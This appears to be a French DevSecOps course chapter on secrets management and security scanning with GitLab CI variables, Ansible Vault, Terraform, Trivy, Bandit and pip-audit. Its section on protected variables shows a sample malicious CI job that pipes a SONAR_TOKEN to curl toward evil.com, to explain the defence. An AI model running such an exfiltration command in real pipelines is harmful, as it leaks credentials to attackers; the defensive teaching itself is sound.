# Etape 8 : Securite et Gestion des Secrets

> **Objectif** : Appliquer les bonnes pratiques de securite dans tout le pipeline,
> gerer les secrets correctement, et mettre en place les scans de securite.

---

## Table des Matieres

1. [Regle Fondamentale : Ne Jamais Commiter de Secrets](#1-regle-fondamentale--ne-jamais-commiter-de-secrets)
2. [GitLab CI/CD Variables Protegees](#2-gitlab-cicd-variables-protegees)
3. [Ansible Vault](#3-ansible-vault)
4. [Terraform Variables Sensibles](#4-terraform-variables-sensibles)
5. [.gitignore pour la Securite](#5-gitignore-pour-la-securite)
6. [Trivy : Scan de Conteneurs](#6-trivy--scan-de-conteneurs)
7. [Bandit : Analyse Securite Python](#7-bandit--analyse-securite-python)
8. [OWASP Dependency-Check](#8-owasp-dependency-check)

---

## 1. Regle Fondamentale : Ne Jamais Commiter de Secrets

### Les Secrets Typiques

| Secret | Ou il est utilise | Danger si expose |
|---|---|---|
| Token SonarQube | Pipeline CI → SonarQube | Masquer des vulnerabilites |
| Cle SSH | Pipeline CI → serveurs | Acces total aux serveurs |
| Mot de passe BDD | Application → base de donnees | Vol de donnees |
| Token Docker Registry | Pipeline CI → registry | Push d'images malveillantes |
| Cles API | Application → services externes | Utilisation frauduleuse |
| Ansible Vault password | Pipeline CI → Ansible | Dechiffrement des secrets |

### Que Faire si un Secret est Commite ?

1. **Revoquer immediatement** le secret (regener le token, changer le mot de passe)
2. Le simple fait de supprimer le fichier ne suffit pas : l'historique Git conserve tout
3. Si necessaire : `git filter-branch` ou outil `BFG Repo-Cleaner`
4. **Prevenir** : configurer des pre-commit hooks pour detecter les secrets

### Comment ca Arrive ?

```bash
# DANGER : ces commandes exposent des secrets
git add .                    # Ajoute TOUT, y compris les secrets
git add -A                   # Pareil
echo "token=abc123" > .env   # Puis git add .env

# CORRECT
git add app.py tests/        # Ajouter fichier par fichier
```

---

## 2. GitLab CI/CD Variables Protegees

### 2.1 Types de Variables

| Type | Description | Cas d'usage |
|---|---|---|
| **Variable** | Valeur injectee comme variable d'environnement | Token, URL |
| **File** | Valeur ecrite dans un fichier temporaire | Cle SSH, certificat |

### 2.2 Options de Protection

| Option | Effet |
|---|---|
| **Protected** | Disponible uniquement sur les branches protegees (main, release) |
| **Masked** | La valeur est masquee dans les logs du pipeline (affiche `[MASKED]`) |
| **Expand variables** | Permet la substitution `$VARIABLE` dans la valeur |

### 2.3 Configuration

Allez dans **Settings > CI/CD > Variables** :

| Variable | Protected | Masked | Type |
|---|---|---|---|
| `SONAR_TOKEN` | Oui | Oui | Variable |
| `SONAR_HOST_URL` | Non | Non | Variable |
| `SSH_PRIVATE_KEY` | Oui | Oui | File |
| `SSH_KNOWN_HOSTS` | Non | Non | Variable |
| `DOCKER_REGISTRY_PASSWORD` | Oui | Oui | Variable |
| `ANSIBLE_VAULT_PASSWORD` | Oui | Oui | Variable |

### 2.4 Utilisation dans le Pipeline

```yaml
# Les variables sont automatiquement disponibles comme var d'env
sonarqube-analysis:
  script:
    - sonar-scanner -Dsonar.token=${SONAR_TOKEN}  # Variable masquee
    # Dans les logs : sonar-scanner -Dsonar.token=[MASKED]

deploy:
  before_script:
    - echo "$SSH_PRIVATE_KEY" > ~/.ssh/id_rsa   # Variable de type File
    - chmod 600 ~/.ssh/id_rsa
```

### 2.5 Pourquoi "Protected" ?

Une variable protegee n'est pas disponible sur les branches non-protegees.
Cela empeche un attaquant de creer une branche qui exfiltre les secrets :

```yaml
# Sur une branche non-protegee, ce job N'AURA PAS acces a SONAR_TOKEN
malicious-job:
  script:
    - echo $SONAR_TOKEN | curl -X POST https://evil.com -d @-
    # → $SONAR_TOKEN sera vide
```

---

## 3. Ansible Vault

### 3.1 Chiffrer des Variables

```bash
# Creer un fichier de secrets chiffre
ansible-vault create secrets.yml
# Entrez le mot de passe du vault

# Contenu (avant chiffrement) :
# db_password: "super_secret_123"
# api_key: "sk-abcdef123456"
```

### 3.2 Fichier Chiffre

```
$ANSIBLE_VAULT;1.1;AES256
36613962346362393735326537393533...
```

Meme si ce fichier est commite dans Git, il est illisible sans le mot de passe.

### 3.3 Utiliser dans un Playbook

```yaml
# playbook.yml
- hosts: app_servers
  vars_files:
    - secrets.yml      # Fichier chiffre
  tasks:
    - name: Configure app
      template:
        src: config.j2
        dest: /opt/app/config.yml
      vars:
        password: "{{ db_password }}"  # Variable dechiffree a l'execution
```

### 3.4 Executer avec le Vault

```bash
# Demander le mot de passe interactivement
ansible-playbook playbook.yml --ask-vault-pass

# Utiliser un fichier de mot de passe
ansible-playbook playbook.yml --vault-password-file .vault_password

# Via variable d'environnement (GitLab CI)
ansible-playbook playbook.yml \
  --vault-password-file <(echo "$ANSIBLE_VAULT_PASSWORD")
```

---

## 4. Terraform Variables Sensibles

### 4.1 Marquer une Variable comme Sensitive

```hcl
variable "db_password" {
  description = "Database password"
  type        = string
  sensitive   = true   # ← Ne sera JAMAIS affiche dans les logs
}
```

### 4.2 Effet de `sensitive = true`

```
# terraform plan
  + resource "docker_container" "app" {
      + environment = [
          + "DB_PASSWORD=(sensitive value)",   # ← Masque !
        ]
```

### 4.3 Passer des Variables Sensibles

```bash
# Option 1 : Variable d'environnement
export TF_VAR_db_password="super_secret_123"
terraform apply

# Option 2 : Fichier .tfvars (NE PAS commiter !)
# secrets.tfvars
# db_password = "super_secret_123"
terraform apply -var-file=secrets.tfvars

# Option 3 : Prompt interactif
terraform apply
# var.db_password
#   Enter a value: ****
```

### 4.4 Proteger le State

Le fichier `terraform.tfstate` contient les valeurs en clair, meme les variables
sensibles. Il doit etre :
- Dans le `.gitignore`
- Chiffre si stocke a distance (S3 avec encryption)
- Accessible uniquement par les personnes autorisees

---

## 5. .gitignore pour la Securite

### Fichiers a Ignorer Absolument

```gitignore
# Secrets et credentials
*.pem
*.key
*.crt
.env
.env.*
secrets.yml
secrets.tfvars
.vault_password

# Terraform state (contient des secrets en clair)
*.tfstate
*.tfstate.backup
.terraform/

# Python
__pycache__/
*.pyc
venv/
.pytest_cache/

# IDE
.vscode/
.idea/

# OS
.DS_Store
Thumbs.db
```

### Verifier qu'aucun Secret n'est Track

```bash
# Verifier les fichiers trackes
git ls-files | grep -i -E "(secret|password|key|token|env)"

# Si un fichier sensible est tracke, le retirer
git rm --cached .env
echo ".env" >> .gitignore
git add .gitignore
git commit -m "Remove tracked secret file"
```

---

## 6. Trivy : Scan de Conteneurs

### 6.1 Qu'est-ce que Trivy ?

**Trivy** est un scanner de vulnerabilites open-source (par Aqua Security) qui detecte :
- Vulnerabilites dans les **packages OS** de l'image Docker
- Vulnerabilites dans les **dependances** (pip, npm, etc.)
- **Misconfigurations** dans les Dockerfile, Kubernetes, Terraform

### 6.2 Scanner une Image Docker

```bash
# Scanner l'image de l'application
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image finance-app:latest

# Scanner uniquement les vulns critiques
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy:latest image --severity CRITICAL finance-app:latest
```

### 6.3 Scanner les Fichiers du Projet

```bash
# Scanner les dependances Python (requirements.txt)
docker run --rm -v $(pwd):/project aquasec/trivy:latest fs /project/app/
```

### 6.4 Sortie Typique

```
finance-app:latest (debian 12.4)
Total: 3 (HIGH: 2, CRITICAL: 1)

┌──────────────┬───────────────┬──────────┬───────────────┬──────────────────────────┐
│   Library    │ Vulnerability │ Severity │ Installed Ver │        Fixed Ver         │
├──────────────┼───────────────┼──────────┼───────────────┼──────────────────────────┤
│ libssl3      │ CVE-2024-xxxx │ CRITICAL │ 3.0.11-1      │ 3.0.13-1                │
│ curl         │ CVE-2024-yyyy │ HIGH     │ 7.88.1-10+d12 │ 7.88.1-10+d12u1         │
│ libexpat1    │ CVE-2024-zzzz │ HIGH     │ 2.5.0-1       │ 2.5.0-1+deb12u1         │
└──────────────┴───────────────┴──────────┴───────────────┴──────────────────────────┘
```

### 6.5 Dans le Pipeline GitLab CI

```yaml
trivy-scan:
  stage: security
  image:
    name: aquasec/trivy:latest
    entrypoint: [""]
  script:
    # Scanner les fichiers sources
    - trivy fs --severity HIGH,CRITICAL --exit-code 1 app/
    # Scanner l'image Docker (si elle est disponible)
    - trivy image --severity HIGH,CRITICAL --exit-code 0 $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA || true
```

### 6.6 Reduire les Vulnerabilites

| Action | Impact |
|---|---|
| Utiliser `python:3.11-slim` au lieu de `python:3.11` | Moins de packages = moins de vulns |
| Mettre a jour l'image de base regulierement | Correctifs de securite inclus |
| Utiliser `--no-cache-dir` dans pip | Pas de fichiers temporaires |
| Multi-stage build | L'image finale ne contient que le necessaire |

---

## 7. Bandit : Analyse Securite Python

### 7.1 Qu'est-ce que Bandit ?

**Bandit** est un outil d'analyse statique de securite (SAST) specialise pour Python.
Il detecte les patterns de code dangereux.

### 7.2 Installation et Utilisation

```bash
# Installer
pip install bandit

# Scanner le code
bandit -r app/ -f screen

# Scanner avec sortie JSON
bandit -r app/ -f json -o bandit-report.json

# Exclure les tests
bandit -r app/ --exclude app/tests/
```

### 7.3 Problemes Detectes par Bandit

| ID | Description | Severite | Exemple |
|---|---|---|---|
| B101 | assert utilise | Low | `assert user.is_admin` |
| B105 | Mot de passe en dur | Medium | `password = "admin123"` |
| B301 | Utilisation de pickle | Medium | `pickle.loads(data)` |
| B303 | Hashage MD5/SHA1 | Medium | `hashlib.md5(data)` |
| B307 | Utilisation de eval | High | `eval(user_input)` |
| B501 | SSL verification desactivee | High | `verify=False` |
| B602 | Subprocess avec shell=True | High | `subprocess.call(cmd, shell=True)` |
| B608 | SQL injection | High | `"SELECT * FROM " + table` |

### 7.4 Dans le Pipeline GitLab CI

```yaml
bandit-sast:
  stage: security
  image: python:3.11-slim
  script:
    - pip install bandit
    - bandit -r app/ -f json -o bandit-report.json --severity-level medium || true
    - bandit -r app/ -f screen --severity-level medium
  artifacts:
    paths:
      - bandit-report.json
```

### 7.5 Gerer les Faux Positifs

```python
# Si Bandit signale un faux positif, vous pouvez le marquer :
password = get_password_from_vault()  # nosec B105
# Le commentaire # nosec desactive l'alerte pour cette ligne
```

---

## 8. OWASP Dependency-Check

### 8.1 Qu'est-ce que c'est ?

**OWASP Dependency-Check** est un outil de **Software Composition Analysis (SCA)**.
Il verifie si les dependances du projet (Flask, Gunicorn, etc.) ont des vulnerabilites connues (CVE).

### 8.2 Pourquoi c'est Important ?

80% du code d'une application provient de dependances tierces. Une vulnerabilite dans
Flask ou une autre librairie affecte directement votre application.

### 8.3 Utilisation avec pip-audit

```bash
# Installation
pip install pip-audit

# Scanner les dependances
pip-audit -r app/requirements.txt

# Sortie
Found 2 known vulnerabilities in 1 package
Name    Version  ID               Fix Versions
------  -------  ---------------  ------------
Flask   2.3.0    PYSEC-2023-xxxx  2.3.2
Flask   2.3.0    CVE-2023-xxxxx   2.3.2
```

### 8.4 Dans le Pipeline

```yaml
dependency-check:
  stage: security
  image: python:3.11-slim
  script:
    - pip install pip-audit
    - pip-audit -r app/requirements.txt --format json -o audit-report.json || true
    - pip-audit -r app/requirements.txt
  artifacts:
    paths:
      - audit-report.json
```

---

## Resume : Defense en Profondeur

```
┌───────────────────────────────────────────────────────────────┐
│  COUCHE 1 : PREVENTION (avant le commit)                     │
│  → .gitignore, pre-commit hooks, revue de code               │
├───────────────────────────────────────────────────────────────┤
│  COUCHE 2 : DETECTION STATIQUE (dans le pipeline)            │
│  → SonarQube (qualite+secu), Bandit (SAST Python)            │
├───────────────────────────────────────────────────────────────┤
│  COUCHE 3 : ANALYSE DES DEPENDANCES (dans le pipeline)       │
│  → pip-audit, OWASP Dependency-Check                         │
├───────────────────────────────────────────────────────────────┤
│  COUCHE 4 : SCAN D'IMAGES (apres le build)                   │
│  → Trivy (vulns OS + packages dans l'image Docker)           │
├───────────────────────────────────────────────────────────────┤
│  COUCHE 5 : SECRETS MANAGEMENT (tout au long)                │
│  → GitLab CI vars, Ansible Vault, Terraform sensitive        │
├───────────────────────────────────────────────────────────────┤
│  COUCHE 6 : MONITORING (en production)                       │
│  → Prometheus alertes, Grafana dashboards                    │
└───────────────────────────────────────────────────────────────┘
```

---

## Fichiers a Examiner

- `.gitignore` — Fichiers ignores
- `.gitlab-ci.yml` — Stages security (Bandit + Trivy)
- `scripts/scan-security.sh` — Script de scan local
- `app/app.py` — Code securise (pas de secrets en dur)
